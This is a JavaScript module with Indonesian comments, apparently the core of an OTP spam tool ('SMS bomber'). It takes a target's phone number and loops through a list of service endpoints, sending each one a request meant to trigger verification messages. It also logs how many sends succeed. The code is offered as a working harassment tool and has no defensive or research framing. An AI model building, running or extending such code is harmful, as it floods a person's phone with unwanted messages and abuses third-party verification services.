/**
 * Main spam engine - menjalankan semua endpoint ke nomor target
 */
const { getEndpoints } = require('./endpoints');
const { sendRequest } = require('./request');
const { normalizePhone, isValidPhone } = require('../utils/validator');
const { logSpamStart, logEndpointResult, logSpamSummary } = require('../console');

/**
 * Jalankan OTP spam ke nomor target
 * @param {string} phone - Nomor telepon target
 * @param {Function} onProgress - Callback progress (opsional)
 * @returns {Promise<Object>} - { success, total, elapsed }
 */
async function spamOtp(phone, onProgress) {
  phone = normalizePhone(phone);

  if (!isValidPhone(phone)) {
    throw new Error('Nomor tidak valid! Format: 6281234567890');
  }

  const endpoints = getEndpoints(phone);
  const total = endpoints.length;

  logSpamStart(phone);

  const results = [];
  const start = Date.now();

  for (let i = 0; i < endpoints.length; i++) {
    const result = await sendRequest(endpoints[i]);
    results.push(result);
    logEndpointResult(result.name, result.success, result.status);

    if (onProgress && typeof onProgress === 'function') {
      onProgress({
        current: i + 1,
        total,
        name: result.name,
        success: result.success
      });
    }
  }

  const elapsed = (Date.now() - start) / 1000;
  const successCount = results.filter(r => r.success).length;

  logSpamSummary(successCount, total, elapsed);

  return {
    success: successCount,
    total,
    elapsed,
    results
  };
}

module.exports = { spamOtp };